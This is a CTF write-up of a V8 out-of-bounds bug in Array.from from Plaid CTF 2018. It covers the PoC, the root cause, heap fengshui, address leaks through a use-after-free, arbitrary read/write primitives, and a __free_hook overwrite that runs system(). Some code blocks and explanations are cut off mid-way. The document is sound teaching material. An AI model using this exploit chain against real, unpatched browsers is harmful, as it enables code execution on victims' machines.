## 0x00 Overview

This is a V8 browser exploitation [challenge](https://ctftime.org/task/6081) from Plaid CTF 2018, and is also a real world vulnerability. The vulnerability is an improper array length setting in `GenerateSetLength`, so the length of array (e.i. `array.length`) can be higher than real length, which can cause array OOB read and write. We can allocate an `ArrayBuffer` object behind the OOB array, read `kBackingStoreOffset` pointer to leak heap address, and write `kBackingStoreOffset` pointer to achieve arbitrary memory read and write. Finally we can use normal `libc` exploitation technique to achieve code execution.

## 0x01 Preparation

Firstly, we need to get the source code of V8. The articles I have read are [this](http://eternalsakura13.com/2018/05/06/v8/) and [this](http://eternalsakura13.com/2018/06/26/v8_environment/) (in Chinese), but there are also resources online so I will not cover this part in detail. the hash of commit with vulnerability is `1dab065bb4025bdd663ba12e2e976c34c3fa6599`, therefore we use the following command to switch to the vulnerable commit.

```
git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
gclient sync
```

Then we can use this to compile the release version of V8 engine:

```
tools/dev/v8gen.py x64.relase
ninja -C out.gn/x64.relase d8
```

After compilation which takes long, there will be a `x64.relase` directory in `out.gn`, so that we can use the `d8` in this way:

```
$ ./x64.release/d8
V8 version 6.7.0 (candidate)
d8> var a
undefined
```

Or we can run the exploit directly:

```
$ ./x64.release/d8 ./exp.js
```

## 0x02 Vulnerability

### PoC

Here is the provided proof of concept.

```javascript
let oobArray = [1.1];
let maxSize = 1028 * 8;
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      let result = this.counter++;
      if (this.counter > maxSize) {
        oobArray.length = 1;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
console.log(oobArray)
```

Firstly let's see what is `Array.from`: [Array.from()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/from).

>The `Array.from()` method creates a new, shallow-copied `Array` instance from an array-like or iterable object.

```javascript
console.log(Array.from('foo'));
// expected output: Array ["f", "o", "o"]

console.log(Array.from([1, 2, 3], x => x + x));
// expected output: Array [2, 4, 6]
```

In PoC, `Array.from.call` is used instead. 

The `this` pointer is a function `function() {return oobArray}`. The intuitive idea is that `this` pointer, which should be `Array` in normal usage, would be used as constructor to construct return value. In normal usage, `new Array` will be called, which construct a new instance; while in PoC, `new (function() {return oobArray})` will be called, which simply return `oobArray` according to JavaScript constructor feature. 

The first argument in PoC is a customized iterable object. For any iterable object, the property `Symbol.iterator` should be defined as a function that returns an iterator, and the returned iterator must have a `next()` method to allow iteration. Maybe an example is more clear.

```javascript
> Symbol.iterator
Symbol(Symbol.iterator)
> a = [1,2,3]
[ 1, 2, 3 ]
> iter = a[Symbol.iterator]()
{} // return an iterator
> iter.next()
{ value: 1, done: false }
> iter.next()
{ value: 2, done: false }
> iter.next()
{ value: 3, done: false }
> iter.next()
{ value: undefined, done: true }
// when `.next()` is called, 
// field `value` is the value in this iteration,
// field `done` specifies if the iteration is finished.
```

Another thing to note is that `Symbol.iterator` is not a string property name as usual, but is a [Symbol](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol). I will not detail this here, what we may need to know is that it can be used as property name, just like string. Let's go back to the challenge. In normal usage, array, which is an iterable object, is passed as argument; but in PoC, a self defined iterable object is passed as argument. Note that `{[Symbol.iterator]: something}` means we are using `Symbol.iterator` as property name, not `[Symbol.iterator]`: the square bracket is just a JavaScript syntax and does not mean array here. In PoC, the iterator is simply an incremental iterator implemented using a `counter`, the key point is `oobArray.length = 1;` being executed when iteration is finished, and I will detail why it is here soon. If this line is deleted from PoC, the vulnerability will not be triggered, and the return value will be `[0,1,2,...,8221,8222,8223]`, which shares the exactly same reference as `oobArray`.

### Root Cause

To understand the root cause of this vulnerability, we need to have a look at the source code of `Array.from`. `Array.from` is written in CSA. You can read [https://v8.dev/blog/csa](https://v8.dev/blog/csa) and [https://v8.dev/docs/csa-builtins](https://v8.dev/docs/csa-builtins) for more details. In simple words, it is a mechanism that allows developer to write assembly code with some high-level abstraction using C++, although this sounds a bit conflicting. 

Here is source code for `Array.from` with my explanation in comments. A weird thing is that the syntax of CSA here is slightly different from CSA covered in 2 links above, and I am not sure why. Fortunately this does not affect our understanding so much. 

```c++
// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) {
    TNode<Context> context = CAST(Parameter(BuiltinDescriptor::kContext));
    //get the context, not really relevant
    TNode<Int32T> argc =
            UncheckedCast<Int32T>(Parameter(BuiltinDescriptor::kArgumentsCount));
    //get the number of arguments, `argc`

    CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));
    //`args` represents all arguments, including `this` 

    TNode<Object> map_function = args.GetOptionalArgumentValue(1);
    //get `mapFn`, in PoC this is simply `undefined`

    {
        Label no_error(this), error(this);
        
        GotoIf(IsUndefined(map_function), &no_error);
        //therfore, this will always jump to label no_error in PoC
        
        GotoIf(TaggedIsSmi(map_function), &error);
        Branch(IsCallable(map_function), &no_error, &error);

        BIND(&error);
        ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);

        BIND(&no_error);
    }

    Label iterable(this), not_iterable(this), finished(this), if_exception(this);

    TNode<Object> this_arg = args.GetOptionalArgumentValue(2);
    // get `thisArg`, which is also undefined and not relevant 
    TNode<Object> items = args.GetOptionalArgumentValue(0);

The root cause of vulnerability is also explained in comments. To sum up, after this PoC, we can use `oobArray` to achieve out-of-bound access.

## 0x03 Exploitation

### Memory Layout of JavaScript Objects

Before exploitation, we may need to understand memory layout of JavaScript Object. Here are some relevant articles: [https://v8.dev/blog/fast-properties](https://v8.dev/blog/fast-properties) and [http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation](http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation). Here I will only cover structures of objects relevant to exploitation of this challenge.

**Floating Point Number Array**

What I mean here is array with all elements being floating point numbers, such as `[1.1, 2.2, 3.3]`. Let's look at its memory layout.

```javascript
d8> a = [1.1,2.2,3.3]
[1.1, 2.2, 3.3]
d8> %DebugPrint(a) // need argument --allow-natives-syntax argument
0x3ca3f398d4d9 <JSArray[3]> // <-- inspect this memory
[1.1, 2.2, 3.3]
```

Press `ctrl+c` and inspect memory in `gdb`.

```
pwndbg> x/10gx 0x3ca3f398d4d9-1
0x3ca3f398d4d8:	0x000009e2d5e02679	0x0000286901c02251
0x3ca3f398d4e8:	0x00003ca3f398d509 <-- inspect this memory 	0x0000000300000000
0x3ca3f398d4f8:	0x000028977d884721	0x000000fbae7a70c1
0x3ca3f398d508:	0x000028977d8832d9	0x0000000300000000
0x3ca3f398d518:	0x3ff199999999999a	0x400199999999999a
pwndbg> x/10gx 0x00003ca3f398d509-1
0x3ca3f398d508:	0x000028977d8832d9	0x0000000300000000 <-- length of fast array, 3
0x3ca3f398d518:	0x3ff199999999999a	0x400199999999999a <-- elements in fast array
0x3ca3f398d528:	0x400a666666666666 <-- 1.1 2.2 3.3 in IEEE double	0x000028977d882361
0x3ca3f398d538:	0x0000000200000000	0x0000000000000000
0x3ca3f398d548:	0x000000fbae7a71a1	0x000028977d882361
```

Here are one point to note: we need `-1` for memory addresses, this is because V8 uses least significant bit to specify if the `JsObject` is an address or a `Smi` (small integer). Bit `1` means it is an address pointing to a `JsObject` instance (need to clear this bit to 0 before used as memory address); bit `0` means it is an `Smi`, whose high 32 bits is used to store the value of integer.

Note that this is the case *only when* the array can be represented using floating point numbers only. For example, this is the case for `[1.1, 2, 3]` because `2` and `3` can still be represented using floating point number, but not the case for `[1.1, [1.2], {}]`, because there is array and object inside it. Also, the reason why initial value of `oobArray` is `[1.1]` instead of `[]` is that if it is an empty array initially and integer are pushed into it, the final array will be an `smi` array instead of a double floating point array.

**ArrayBuffer**

These [pictures](https://xz.aliyun.com/t/5190#img11) should be clearer than any explanation.

![](images/ArrayBuffer.png)

![](images/ArrayBufferGDB.png)

So why do we need these structures? The key point is that in `ArrayBuffer`, the buffer pointer is stored like C. As you can see, the `kBackingStoreOffset` pointer is on `libc` heap instead of V8 GC and the least significant bit of this address is 0 instead of 1 unlike other V8 objects. That buffer is a pure C buffer containing only data. Therefore, if we can rewrite this pointer, we can have arbitrary memory read and write, and we can also read the value of pointer `kBackingStoreOffset` to leak heap address!

### Exploitation Idea

**Allocate `ArrayBuffer` using Heap Fengshui**

After PoC code is executed, `oobArray` is now a double floating point array with length longer than actual length. The idea is, if we can put an `ArrayBuffer` instance behind the floating point fast array, we can read and write the `kBackingStoreOffset` field of the `ArrayBuffer` by reading and writing the `oobArray`. How could we allocate `ArrayBuffer` just behind the double floating point fast array? The way is to use heap fengshui. Let's look at the code.

```javascript
next()
{
    let result = this.counter++;
    if (this.counter > maxSize)
    {
        oobArray.length = 1;
        for (var i = 0; i < 0x1000; i++)
        {
            arrayBuffers.push(new ArrayBuffer(0x2000+i));
        }
        return {done: true};
    }
    else
    {
        return {value: result, done: false};
    }
}
```

This is the modified version of `next` function in iterator. After length is set to 1, we tried to allocate `0x1000` `ArrayBuffer` with different length, and hope to enable an `ArrayBuffer` to be allocated behind the fast floating point array. Number `0x1000` is found by trial, because by using `gdb`, we can find that if `0x1000` `ArrayBuffer` is allocated, the `ArrayBuffer` will lay just behind the fast array.

**Find `ArrayBuffer`**

Okay now we have an array of `ArrayBuffer` instance, with some of them laying behind the fast array of `oobArray` and we can read and write their field by using OOB access of `oobArray`. However, firstly we need to find the offset of `ArrayBuffer` to fast array of `oobArray`, namely the index of `oobArray`; we also need to find which `ArrayBuffer` it is, namely the index of `arrayBuffers`.

Before that, we may need a converter to convert double to integer, because the array we are operating on is a floating point array.

```javascript
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
```

A interesting point to note is that JavaScript will store integer larger than `2^32` as double floating point number, so if the number is too large, the accuracy will hurts. For example:

```javascript
d8> tmp = [0xdeadbeef, 0xcafebabe]
[3735928559, 3405691582]

This is because IEEE double floating point number will only use 52 bits to record the fraction, so number with 64-bit fraction cannot be represented by IEEE double floating point number. But fortunately, relevant numbers covered here such as the memory addresses will only have maximum `6 * 8 = 48` bits, so this will not cause problem.

Back to the `ArrayBuffer`, to find `ArrayBuffer`, we must know the feature of memory layout of `ArrayBuffer`.

```

Therefore, here is the code to find `ArrayBuffer` in fast array of `oobArray`:

```javascript
function find2ArrayBuffer(oobArray)
{
    const inSizeRange = (x) => x >= 0x2000 && x < 0x3000;
    var count = 0;
    var ret = [];
    for (let i = 0; i < oobArray.length; )
    {
        const tmp = d2u(oobArray[i]) / 0x100000000;
        if (inSizeRange(tmp) &&
            oobArray[i + 1] == oobArray[i + 2] &&
            inSizeRange(d2u(oobArray[i + 3])) &&
            tmp == d2u(oobArray[i + 3])) // if match feature of ArrayBuffer
        {
            ret.push({idx: tmp - 0x2000, off : i}); // record `idx` and `off`
            ++count;
            if (count >= 2) // find 2 ArrayBuffer to construct UAF, covered later
                return ret;
            i += 4;
        }
        else
        {
            ++i;
        }
    }
}
```

The return value of this function is `[{"idx":0,"off":4},{"idx":1,"off":14}]`, if we use `console.log(JSON.stringify(jsonAB))` to log it.

**Leaking Information**

Okay, now we have 2 `ArrayBuffer` instances, and we know the both their indexes in `oobArray` and `arrayBuffers`. We can leak heap address easily.

```javascript
var heap1 = d2u(oobArray[jsonAB[0].off + 1]);
var heap2 = d2u(oobArray[jsonAB[1].off + 1]);
console.log(heap1.toString(16) + ' ' + heap2.toString(16));
```

Then we need to leak `libc` address first. My approach is to construct a UAF. Since we can rewrite any field in `ArrayBuffer`, we can rewrite pointer in one `ArrayBuffer` to the pointer in another `ArrayBuffer`. Then delete one of the `ArrayBuffer` by removing all references to it, and trigger garbage collection, so the buffer is freed. However, the buffer is still used by another `ArrayBuffer`, and if `fd` or `bk` points to somewhere in `main_arena`, we can leak the `libc` address by reading that `ArrayBuffer`. Here is the codes:

```javascript
oobArray[jsonAB[1].off + 1] = oobArray[jsonAB[0].off + 1];
oobArray[jsonAB[1].off + 2] = oobArray[jsonAB[0].off + 2];
//rewrite the pointer to the same buffer to construct UAF
//there are 2 pointers with same value so rewrite both of them
for (var i = 0; i < arrayBuffers.length; i++)
{// deleting all other arrayBuffers are also choice made by trial
	if (i != jsonAB[0].idx)
		arrayBuffers[i] = undefined;
}
for (var i = 0; i < 0x1000; i++)
{ // 0x1000 is also obtained by trial
	arrayBuffers.push(new ArrayBuffer(0x2010));
}
//delete referece and trigger GC
```

Now the pointer in `arrayBuffer[jsonAB[1].idx]`, which is also pointer in `arrayBuffer[jsonAB[1].idx]`, is freed, and it is in unsorted bin, so we can read the `libc` address by reading `fd` pointer. Note that, I made it end up in this way by trials. If you change `0x1000` to something else, for example, it might not end up in this way.

By reading this buffer, `libc` address can be obtained.

```javascript
const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
var libcAddr = d2u(tmp[0]);
libcAddr -= 0x3ec340
console.log(libcAddr.toString(16));
```

**Arbitrary Read and Write**

Now we have `libc` address, the next idea is to rewrite `__free_hook` to `system` and execute arbitrary bash command, but before that, we may want to implement the function that achieve arbitrary read and write.

```javascript
function memRead(addr)
{
	oobArray[jsonAB[0].off + 1] = u2d(addr);
	oobArray[jsonAB[0].off + 2] = u2d(addr);
	const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
	return d2u(tmp[0]);
}
function memWrite(addr, val)
{
	oobArray[jsonAB[0].off + 1] = u2d(addr);
	oobArray[jsonAB[0].off + 2] = u2d(addr);
	const tmp = new Float64Array(arrayBuffers[jsonAB[0].idx], 0, 8);
	tmp[0] = u2d(val);
}
```

**Arbitrary Code Execution**

Finally, pop up the calculator in this way:

```javascript
memWrite(libcAddr + 0x3ed8e8, libcAddr + 0x4f440); // free hook
const binsh = new Uint32Array(new ArrayBuffer(0x30));
cmd = [1634628399, 1768042352, 1852256110, 761621871, 1668047203, 1952541813, 29295];
// "/snap/bin/gnome-calculator"
for (var i = 0; i < cmd.length; i++)
	binsh[i] = cmd[i];
```

When the program terminates, all `ArrayBuffer` will be freed, so `system("/snap/bin/gnome-calculator")` will be executed. You can also trigger the garbage collection to free the buffer, which is same as the approach mentioned above.

**Others**

If you want to execute the shellcode, we may need to use ROP to call `mprotect` on heap page and jump to that memory, which is just normal Linux exploitation and not very related to V8, so I will not cover it here. The way to construct ROP is writing on the stack (we can leak stack address by `environ` symbol in `libc`) and to use `add rsp,xxx; ret;` gadget to jump to ROP chain. We need to make `xxx` quite big to make sure memory to write ROP is in memory region of functions underneath so it will not affect or be affected by JavaScript execution. We can also spray the stack a bit and fill it with address of `ret` to make sure ROP will be executed.

Also, although in the provided version of V8, JIT page is not `rwx` (and this is the reason why I use `glibc` exploitation), but it seems that web assembly will produce `rwx`. I will investigate this in the future.
